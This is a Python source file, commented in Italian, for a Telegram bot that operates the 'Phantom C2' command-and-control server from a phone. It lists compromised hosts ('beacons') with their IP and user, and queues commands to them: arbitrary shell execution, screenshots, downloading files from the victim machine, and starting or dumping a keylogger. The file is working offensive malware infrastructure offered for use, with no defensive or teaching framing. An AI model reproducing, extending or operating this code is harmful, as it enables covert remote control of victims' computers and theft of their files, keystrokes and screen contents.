"""
Telegram C2 bot — gestisci beacon da mobile via Telegram.
Richiede: pip install python-telegram-bot

Setup: @BotFather → /newbot → salva token in PHANTOM_TELEGRAM_BOT_TOKEN nel .env

Comandi:
  /start          — info bot e beacon attivi
  /beacons        — lista beacon con stato
  /interact <id>  — seleziona beacon per comandi
  /sysinfo        — sysinfo del beacon attivo
  /whoami         — whoami
  /pwd            — directory corrente
  /ls [path]      — listing directory
  /shell <cmd>    — esegui comando shell
  /screenshot     — screenshot (torna base64 via file Telegram)
  /results        — risultati in attesa
  /exit           — deseleziona beacon
"""

import os
import json
import base64
import threading
import logging
import urllib.request
import urllib.error
import tempfile
from datetime import datetime
from io import BytesIO

logger = logging.getLogger(__name__)

try:
    from telegram import Update, Bot
    from telegram.ext import Application, CommandHandler, ContextTypes, CallbackContext
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

BOT_TOKEN = os.getenv("PHANTOM_TELEGRAM_BOT_TOKEN", "")
C2_API = os.getenv("PHANTOM_C2_API", "http://127.0.0.1:8080")

active_beacon = None
bot_app = None


def _api_get(path):
    try:
        r = urllib.request.urlopen(C2_API + path, timeout=10)
        return json.loads(r.read())
    except Exception:
        return None


def _api_post(path, data):
    try:
        body = json.dumps(data).encode()
        r = urllib.request.urlopen(C2_API + path, data=body, timeout=10)
        return json.loads(r.read())
    except Exception:
        return None


def _wait_result(bid, initial, timeout=20):
    deadline = datetime.now().timestamp() + timeout
    while datetime.now().timestamp() < deadline:
        r = _api_get(f"/api/v1/results?beacon_id={bid}")
        if r and len(r.get("results", [])) > initial:
            return r["results"][-1]["output"]
    return "[timeout]"


async def _cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    beacons = _api_get("/api/v1/beacons")
    n = len(beacons) if beacons else 0
    await update.message.reply_text(
        f"Phantom C2 Bot 🤖\nBeacon attivi: {n}\n\n"
        "/beacons — lista\n/interact &lt;id&gt; — seleziona\n"
        "/help — tutti i comandi"
    )


async def _cmd_beacons(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    beacons = _api_get("/api/v1/beacons")
    if not beacons:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    lines = []
    for bid, info in beacons.items():
        os_ = info.get("os", "?")[:20]
        ip = info.get("ip", "?")
        user = info.get("user", "?")
        last = info.get("last_seen", "?")
        sel = " ⬅️" if bid == active_beacon else ""
        lines.append(f"`{bid[:30]}...`{sel}\n  {os_} | {ip} | {user}\n  last: {last}")
    await update.message.reply_text("\n\n".join(lines))


async def _cmd_interact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global active_beacon
    if not ctx.args:
        await update.message.reply_text("Uso: /interact <beacon_id>")
        return
    bid = ctx.args[0]
    beacons = _api_get("/api/v1/beacons")
    if not beacons or bid not in beacons:
        # match parziale
        match = [b for b in (beacons or {}) if b.startswith(bid)]
        if not match:
            await update.message.reply_text("Beacon non trovato.")
            return
        bid = match[0]
    active_beacon = bid
    info = beacons[bid]
    await update.message.reply_text(
        f"✅ Interacting with {bid[:30]}...\n"
        f"  {info.get('os', '?')} | {info.get('ip', '?')} | {info.get('user', '?')}"
    )


async def _cmd_exit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global active_beacon
    active_beacon = None
    await update.message.reply_text("Beacon deselezionato.")


async def _cmd_results(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
        return
    r = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    if not r or not r.get("results"):
        await update.message.reply_text("Nessun risultato.")
        return
    out = r["results"][-1].get("output", "")
    await update.message.reply_text(f"```\n{out[:3000]}\n```")


async def _cmd_simple(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
        return
    cmd = update.message.text.lstrip("/")
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": cmd})
    out = _wait_result(active_beacon, n0)
    await update.message.reply_text(f"```\n{out[:3000]}\n```")


async def _cmd_shell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    if not ctx.args:
        await update.message.reply_text("Uso: /shell <comando>")
        return
    cmd = "shell " + " ".join(ctx.args)
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": cmd})
    out = _wait_result(active_beacon, n0)
    await update.message.reply_text(f"```\n{out[:3000]}\n```")


async def _cmd_screenshot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": "screenshot"})
    out = _wait_result(active_beacon, n0)
    if not out:
        await update.message.reply_text("Timeout screenshot.")
        return
    if out.startswith("SCREENSHOT_B64:"):
        b64 = out[len("SCREENSHOT_B64:"):]
        try:
            data = base64.b64decode(b64)
            bio = BytesIO(data)
            bio.name = "screenshot.bmp"
            await update.message.reply_photo(bio)
        except Exception:
            await update.message.reply_text(f"Errore decode: {out[:200]}")
    else:
        await update.message.reply_text(f"```\n{out[:2000]}\n```")


async def _cmd_download(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    if not ctx.args:
        await update.message.reply_text("Uso: /download <filepath>")
        return
    filepath = " ".join(ctx.args)
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": f"download {filepath}"})
    out = _wait_result(active_beacon, n0, timeout=30)
    if not out:
        await update.message.reply_text("Timeout download.")
        return
    if out.startswith("FILE_B64:"):
        b64 = out[len("FILE_B64:"):]
        try:
            data = base64.b64decode(b64)
            bio = BytesIO(data)
            bio.name = os.path.basename(filepath) or "file"
            await update.message.reply_document(bio)
        except Exception:
            await update.message.reply_text(f"Errore decode: {out[:200]}")
    else:
        await update.message.reply_text(f"```\n{out[:2000]}\n```")


async def _cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        "🤖 *Phantom C2 Bot*\n\n"
        "*Gestione:*\n"
        "/beacons — lista beacon\n"
        "/interact `<id>` — seleziona beacon\n"
        "/exit — deseleziona\n"
        "/results — risultati recenti\n\n"
        "*Comandi beacon:*\n"
        "/sysinfo — info sistema\n"
        "/whoami — utente\n"
        "/pwd — directory\n"
        "/ls `[path]` — listing\n"
        "/shell `<cmd>` — esegui comando\n"
        "/screenshot — cattura schermo\n"
        "/download `<path>` — scarica file\n"
        "/keylog start|stop|dump — keylogger"
    )
    await update.message.reply_text(text)


def start_bot():
    global bot_app
    if not TELEGRAM_AVAILABLE:
        logger.error("python-telegram-bot non installato. pip install python-telegram-bot")
        return
    if not BOT_TOKEN:
        logger.error("PHANTOM_TELEGRAM_BOT_TOKEN non impostato nel .env")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", _cmd_start))
    app.add_handler(CommandHandler("beacons", _cmd_beacons))
    app.add_handler(CommandHandler("interact", _cmd_interact))
    app.add_handler(CommandHandler("exit", _cmd_exit))
    app.add_handler(CommandHandler("results", _cmd_results))
    app.add_handler(CommandHandler("help", _cmd_help))

    for cmd in ["sysinfo", "whoami", "pwd", "ls", "netstat", "processes", "keylog"]:
        app.add_handler(CommandHandler(cmd, _cmd_simple))

    app.add_handler(CommandHandler("shell", _cmd_shell))
    app.add_handler(CommandHandler("screenshot", _cmd_screenshot))
    app.add_handler(CommandHandler("download", _cmd_download))

    logger.info("Telegram bot avviato.")
    bot_app = app
    app.run_polling(allowed_updates=Update.ALL_TYPES)


def run():
    t = threading.Thread(target=start_bot, daemon=True)
    t.start()
    print("[Telegram Bot] Avviato in background")
    return t


if __name__ == "__main__":
    start_bot()
